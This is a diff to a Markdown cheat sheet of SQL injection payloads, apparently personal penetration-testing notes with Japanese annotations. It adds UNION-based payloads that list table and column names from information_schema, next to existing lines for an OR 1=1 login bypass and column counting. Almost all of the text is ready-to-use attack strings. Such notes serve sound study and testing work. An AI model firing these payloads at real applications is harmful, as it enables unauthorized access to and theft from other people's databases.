@@ -54,9 +54,20 @@ kevin' OR 1=1 -- //
 ```
 
 #### Determining the number of columns
+*unionで結合する際は結合先のカラム数に合わせないとエラーになる*
 
 ```bash
 ' union select null, null, null, null, null;--
+```
+
+## Table名の取得
+```zsh
+' union select database(), table_name, null, null, null from information_schema.tables;-- 
+```
+
+## Column名の取得
+```zsh
+' union select database(), table_name, column_name, null, null from information_schema.columns;-- 
 ```
 
 ```bash
